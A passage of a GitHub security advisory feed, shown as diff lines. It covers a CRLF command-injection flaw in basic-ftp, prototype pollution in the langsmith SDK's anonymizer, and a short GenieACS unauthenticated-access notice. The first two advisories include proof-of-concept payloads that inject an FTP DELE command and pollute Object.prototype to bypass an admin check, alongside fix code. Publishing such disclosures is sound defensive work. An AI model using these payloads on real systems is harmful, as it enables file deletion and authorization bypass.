-<p>basic-ftp's CRLF injection protection (added in commit 2ecc8e2 for GHSA-chqc-8p9q-pq6q) is incomplete. Two code paths bypass the <code>protectWhitespace()</code> control character check: (1) the <code>login()</code> method directly concatenates user-supplied credentials into USER/PASS FTP commands without any validation, and (2) the <code>_openDir()</code> method sends an MKD command before <code>cd()</code> invokes <code>protectWhitespace()</code>, creating a TOCTOU bypass. Both vectors allow an attacker who controls input to inject arbitrary FTP commands into the control connection.</p>
-<h2 id="details">Details</h2>
-<h3 id="vector-1-credential-injection-login">Vector 1: Credential Injection (login)</h3>
-<p>The <code>login()</code> method constructs FTP commands by direct string concatenation with no CRLF validation:</p>
-<pre><code class="language-typescript">// src/Client.ts:216-231
-login(user = "anonymous", password = "guest"): Promise&lt;FTPResponse&gt; {
-    this.ftp.log(`Login security: ${describeTLS(this.ftp.socket)}`)
-    return this.ftp.handle("USER " + user, (res, task) =&gt; {  // Line 218: no validation on `user`
-        // ...
-        else if (res.code === 331) {
-            this.ftp.send("PASS " + password)  // Line 226: no validation on `password`
-        }
-    })
-}
-</code></pre>
-<p><code>FtpContext.send()</code> writes directly to the TCP socket:</p>
-<pre><code class="language-typescript">// src/FtpContext.ts:223-227
-send(command: string) {
-    // ...
-    this._socket.write(command + "\r\n", this.encoding)
-}
-</code></pre>
-<p>The <code>protectWhitespace()</code> method (line 762) rejects <code>\r</code>, <code>\n</code>, and <code>\0</code> characters — but it is only called for path-based operations. Credentials never pass through it.</p>
-<p>The public <code>access()</code> method (line 268) passes <code>options.user</code> and <code>options.password</code> directly to <code>login()</code> with no sanitization.</p>
-<h3 id="vector-2-mkd-toctou-bypass-_opendir">Vector 2: MKD TOCTOU Bypass (_openDir)</h3>
-<p>The <code>_openDir()</code> method sends an MKD command before the CRLF check in <code>cd()</code>:</p>
-<pre><code class="language-typescript">// src/Client.ts:745-748
-protected async _openDir(dirName: string) {
-    await this.sendIgnoringError("MKD " + dirName)  // Line 746: sent BEFORE validation
-    await this.cd(dirName)                           // Line 747: protectWhitespace() called here — too late
-}
-</code></pre>
-<p>This is called from <code>ensureDir()</code> (line 729) which splits a user-supplied remote path by <code>/</code> and passes each fragment to <code>_openDir()</code>, and from <code>_uploadToWorkingDir()</code> (line 679) which passes local directory names read from the filesystem.</p>
-<h2 id="poc">PoC</h2>
-<h3 id="vector-1-credential-injection">Vector 1: Credential Injection</h3>
-<pre><code class="language-javascript">const ftp = require("basic-ftp");
-
-async function exploit() {
-    const client = new ftp.Client();
-    client.ftp.verbose = true;
-
-    // Connect to target FTP server
-    await client.access({
-        host: "target-ftp-server",
-        port: 21,
-        // Username contains CRLF + injected DELE command
-        user: "anonymous\r\nDELE important.txt",
-        password: "guest"
-    });
-    // Server receives on the wire:
-    //   USER anonymous\r\n
-    //   DELE important.txt\r\n
-    //   PASS guest\r\n
-    // The DELE command executes before PASS is processed
-
-    client.close();
-}
-
-exploit();
-</code></pre>
-<h3 id="vector-2-mkd-toctou-bypass">Vector 2: MKD TOCTOU Bypass</h3>
-<pre><code class="language-javascript">const ftp = require("basic-ftp");
-
-async function exploit() {
-    const client = new ftp.Client();
-    client.ftp.verbose = true;
-
-    await client.access({
-        host: "target-ftp-server",
-        user: "anonymous",
-        password: "guest"
-    });
-
-    // Path fragment with CRLF — MKD is sent before cd() validates
-    try {
-        await client.ensureDir("test\r\nDELE important.txt/subdir");
-    } catch (e) {
-        // cd() throws after protectWhitespace() rejects, but MKD + DELE already sent
-    }
-    // Server received:
-    //   MKD test\r\n
-    //   DELE important.txt\r\n
-    //   CWD test\r\n  &lt;-- this may fail, but damage is done
-
-    client.close();
-}
-
-exploit();
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An attacker who controls credentials or remote paths passed to basic-ftp can inject arbitrary FTP commands into the control connection. This enables:</p>
-<ul>
-<li><strong>File deletion</strong>: Inject <code>DELE</code> commands to remove files on the FTP server</li>
-<li><strong>File manipulation</strong>: Inject <code>RNFR</code>/<code>RNTO</code> to rename files, <code>MKD</code>/<code>RMD</code> to create/remove directories</li>
-<li><strong>Server commands</strong>: Inject <code>SITE</code> commands (e.g., <code>SITE CHMOD</code>) to change permissions</li>
-<li><strong>Session hijacking</strong>: Inject <code>USER</code>/<code>PASS</code> to re-authenticate as a different user</li>
-</ul>
-<p>The credential injection vector (Vector 1) is particularly dangerous because it occurs before authentication, meaning the injected commands execute with whatever default permissions the server grants during the login handshake.</p>
-<p>Applications that accept user-supplied FTP credentials (e.g., web-based file managers, backup tools, deployment systems) are directly vulnerable.</p>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Add CRLF validation to both code paths:</p>
-<p><strong>1. Validate credentials in <code>login()</code>:</strong></p>
-<pre><code class="language-typescript">// src/Client.ts:216
-login(user = "anonymous", password = "guest"): Promise&lt;FTPResponse&gt; {
-    if (/[\r\n\0]/.test(user) || /[\r\n\0]/.test(password)) {
-        return Promise.reject(new Error("Invalid credentials: Contains control characters"));
-    }
-    this.ftp.log(`Login security: ${describeTLS(this.ftp.socket)}`)
-    return this.ftp.handle("USER " + user, (res, task) =&gt; {
-        // ... rest unchanged
-    })
-}
-</code></pre>
-<p><strong>2. Validate dirName in <code>_openDir()</code> before sending MKD:</strong></p>
-<pre><code class="language-typescript">// src/Client.ts:745
-protected async _openDir(dirName: string) {
-    if (/[\r\n\0]/.test(dirName)) {
-        throw new Error("Invalid path: Contains control characters");
-    }
-    await this.sendIgnoringError("MKD " + dirName)
-    await this.cd(dirName)
-}
-</code></pre>
-<p>Alternatively, centralize CRLF validation in <code>FtpContext.send()</code> so that all FTP commands are protected regardless of the calling code path.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-6v7q-wjvx-w8wg">https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-6v7q-wjvx-w8wg</a></li>
-<li><a href="https://github.com/patrickjuchli/basic-ftp/commit/20327d35126e57e5fdbaae79a4b65222fbadc53c">https://github.com/patrickjuchli/basic-ftp/commit/20327d35126e57e5fdbaae79a4b65222fbadc53c</a></li>
-<li><a href="https://github.com/patrickjuchli/basic-ftp/releases/tag/v5.2.2">https://github.com/patrickjuchli/basic-ftp/releases/tag/v5.2.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-6v7q-wjvx-w8wg">https://github.com/advisories/GHSA-6v7q-wjvx-w8wg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6v7q-wjvx-w8wg</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-10T20:18:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[langsmith] LangSmith Client SDKs has Prototype Pollution in langsmith-sdk via Incomplete `__proto__` Guard in Internal lodash `set()`]]></title>
-        <id>https://github.com/advisories/GHSA-fw9q-39r9-c252</id>
-        <link href="https://github.com/advisories/GHSA-fw9q-39r9-c252"/>
-        <updated>2026-04-10T20:18:04.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="ghsa-fw9q-39r9-c252-prototype-pollution-via-incomplete-lodash-set-guard-in-langsmith-sdk">GHSA-fw9q-39r9-c252: Prototype Pollution via Incomplete Lodash <code>set()</code> Guard in <code>langsmith-sdk</code></h1>
-<p><strong>Severity:</strong> Medium (CVSS ~5.6)
-<strong>Status:</strong> Fixed in 0.5.18</p>
-<hr>
-<h2 id="summary">Summary</h2>
-<p>The LangSmith JavaScript/TypeScript SDK (<code>langsmith</code>) contains an incomplete prototype pollution fix in its internally vendored lodash <code>set()</code> utility. The <code>baseAssignValue()</code> function only guards against the <code>__proto__</code> key, but fails to prevent traversal via <code>constructor.prototype</code>. This allows an attacker who controls keys in data processed by the <code>createAnonymizer()</code> API to pollute <code>Object.prototype</code>, affecting all objects in the Node.js process.</p>
-<hr>
-<h2 id="affected-products">Affected Products</h2>
-<table>
-<thead>
-<tr>
-<th>Product</th>
-<th>Affected Versions</th>
-<th>Component</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>langsmith</code> (npm)</td>
-<td>&lt;= 0.5.17</td>
-<td><code>js/src/utils/lodash/baseAssignValue.ts</code>, <code>js/src/anonymizer/index.ts</code></td>
-</tr>
-<tr>
-<td>langchain-ai/langsmith-sdk</td>
-<td>GitHub main branch (as of 2026-03-24)</td>
-<td>JS/TypeScript SDK</td>
-</tr>
-</tbody></table>
-<p><strong>Not affected:</strong> The Python SDK (<code>langsmith</code> on PyPI) does not use lodash or an equivalent pattern.</p>
-<hr>
-<h2 id="root-cause">Root Cause</h2>
-<p>The SDK vendors an internal copy of lodash's <code>set()</code> function at <code>js/src/utils/lodash/</code>. The <code>baseAssignValue()</code> function at <code>baseAssignValue.ts:11</code> implements a guard for prototype pollution:</p>
-<pre><code class="language-typescript">function baseAssignValue(object: Record&lt;string, any&gt;, key: string, value: any) {
-  if (key === "__proto__") {
-    Object.defineProperty(object, key, {
-      configurable: true, enumerable: true, value: value, writable: true,
-    });
-  } else {
-    object[key] = value;  // ← No guard for "constructor" or "prototype" keys
-  }
-}
-</code></pre>
-<p>This blocks <code>__proto__</code> pollution but does <strong>not</strong> block the <code>constructor.prototype</code> traversal path. When <code>set()</code> is called with a path like <code>"constructor.prototype.polluted"</code>:</p>
-<ol>
-<li><code>castPath()</code> splits it into <code>["constructor", "prototype", "polluted"]</code></li>
-<li><code>baseSet()</code> iterates: <code>obj.constructor</code> → <code>Object</code> → <code>Object.prototype</code></li>
-<li><code>assignValue(Object.prototype, "polluted", value)</code> calls <code>baseAssignValue()</code></li>
-<li>Key is <code>"polluted"</code> (not <code>"__proto__"</code>), so the guard is bypassed</li>
-<li><code>Object.prototype.polluted = value</code> — all objects are polluted</li>
-</ol>
-<hr>
-<h2 id="attack-vector-via-anonymizer">Attack Vector via Anonymizer</h2>
-<p>The <code>createAnonymizer()</code> API (importable as <code>langsmith/anonymizer</code>) processes data by:</p>
-<ol>
-<li><strong>Extracting string nodes</strong> — <code>extractStringNodes()</code> walks an object recursively and builds dotted paths from keys</li>
-<li><strong>Applying regex replacements</strong> — If a string value matches a configured pattern, the node is marked for update (<code>anonymizer/index.ts:95</code>)</li>
-<li><strong>Writing back with <code>set()</code></strong> — <code>set(mutateValue, node.path, node.value)</code> writes the replaced value back (<code>anonymizer/index.ts:123</code>)</li>
-</ol>
-<p>An attacker who controls keys in data being anonymized can construct a nested object where the path resolves to <code>constructor.prototype.X</code>:</p>
-<pre><code class="language-javascript">{
-  wrapper: {
-    "constructor.prototype.isAdmin": "contains-secret-pattern"
-  }
-}
-</code></pre>
-<p><code>extractStringNodes()</code> produces path <code>"wrapper.constructor.prototype.isAdmin"</code>. When the replacement triggers and <code>set()</code> writes back, it traverses up to <code>Object.prototype</code>.</p>
-<p>Although <code>createAnonymizer()</code> uses <code>deepClone()</code> at <code>anonymizer/index.ts:62</code> (<code>JSON.parse(JSON.stringify(data))</code>), the prototype chain traversal escapes the clone boundary because <code>clone.wrapper.constructor</code> resolves to the global <code>Object</code> constructor, not a cloned copy.</p>
-<hr>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code class="language-javascript">import { createAnonymizer } from "langsmith/anonymizer";
-
-const anonymizer = createAnonymizer([
-  { pattern: "secret", replace: "[REDACTED]" }
-]);
-
-console.log("BEFORE:", ({}).isAdmin);  // undefined
-
-const maliciousInput = {
-  wrapper: {
-    "constructor.prototype.isAdmin": "this-is-secret-data"
-  }
-};
-
-anonymizer(maliciousInput);
-
-console.log("AFTER:", ({}).isAdmin);   // "this-is-[REDACTED]-data"
-console.log("Array:", [].isAdmin);     // "this-is-[REDACTED]-data"
-
-function checkAccess(user) {
-  if (user.isAdmin) return "ACCESS GRANTED";
-  return "ACCESS DENIED";
-}
-console.log(checkAccess({ name: "bob" }));  // "ACCESS GRANTED" ← BYPASSED
-</code></pre>
-<hr>
-<h2 id="impact">Impact</h2>
-<p>Prototype pollution in a Node.js process can enable:</p>
-<ol>
-<li><strong>Authentication bypass</strong> — <code>if (user.isAdmin)</code> checks succeed on all objects</li>
-<li><strong>Remote Code Execution</strong> — Exploitable in template engines (Pug, EJS, Handlebars, Nunjucks) via polluted prototype properties that reach <code>eval()</code>/<code>Function()</code> sinks</li>
-<li><strong>Denial of Service</strong> — Overwriting <code>toString</code>, <code>valueOf</code>, or <code>hasOwnProperty</code> on all objects</li>
-<li><strong>Data exfiltration</strong> — Polluting serialization methods to inject attacker-controlled values</li>
-</ol>
-<hr>
-<h2 id="remediation">Remediation</h2>
-<p>In <code>baseAssignValue.ts</code>, extend the guard to cover <code>constructor</code> and <code>prototype</code> keys:</p>
-<pre><code class="language-typescript">function baseAssignValue(object, key, value) {
-  if (key === "__proto__" || key === "constructor" || key === "prototype") {
-    Object.defineProperty(object, key, {
-      configurable: true, enumerable: true, value, writable: true,
-    });
-  } else {
-    object[key] = value;
-  }
-}
-</code></pre>
-<p>As defense in depth, <code>extractStringNodes()</code> in <code>anonymizer/index.ts</code> should also sanitize or reject path segments matching <code>constructor</code> or <code>prototype</code> before passing them to <code>set()</code>.</p>
-<hr>
-<h2 id="timeline">Timeline</h2>
-<table>
-<thead>
-<tr>
-<th>Date</th>
-<th>Event</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2026-03-24</td>
-<td>Initial report submitted</td>
-</tr>
-<tr>
-<td>2026-04-09</td>
-<td>Vendor confirmed; fixed in 0.5.18</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="credits">Credits</h2>
-<p>Reported by: OneThing4101</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-fw9q-39r9-c252">https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-fw9q-39r9-c252</a></li>
-<li><a href="https://github.com/langchain-ai/langsmith-sdk/pull/2690">https://github.com/langchain-ai/langsmith-sdk/pull/2690</a></li>
-<li><a href="https://github.com/langchain-ai/langsmith-sdk/commit/31d3c3aec02892f4312baae112f817d6b2f0ebe3">https://github.com/langchain-ai/langsmith-sdk/commit/31d3c3aec02892f4312baae112f817d6b2f0ebe3</a></li>
-<li><a href="https://github.com/advisories/GHSA-fw9q-39r9-c252">https://github.com/advisories/GHSA-fw9q-39r9-c252</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fw9q-39r9-c252</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-10T20:18:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[genieacs] GenieACS has an unauthenticated access vulnerability via the NBI API endpoint]]></title>
-        <id>https://github.com/advisories/GHSA-2h6j-mhcp-9j9h</id>
-        <link href="https://github.com/advisories/GHSA-2h6j-mhcp-9j9h"/>
-        <updated>2026-04-10T19:54:54.000Z</updated>
-        <content type="html"><![CDATA[<p>In GenieACS 1.2.13, an unauthenticated access vulnerability exists in the NBI API endpoint.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-56015">https://nvd.nist.gov/vuln/detail/CVE-2025-56015</a></li>
-<li><a href="https://github.com/e1st/CVE-2025-56015">https://github.com/e1st/CVE-2025-56015</a></li>
-<li><a href="https://github.com/advisories/GHSA-2h6j-mhcp-9j9h">https://github.com/advisories/GHSA-2h6j-mhcp-9j9h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2h6j-mhcp-9j9h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-07T21:32:39.000Z</published>
     </entry>
 </feed>
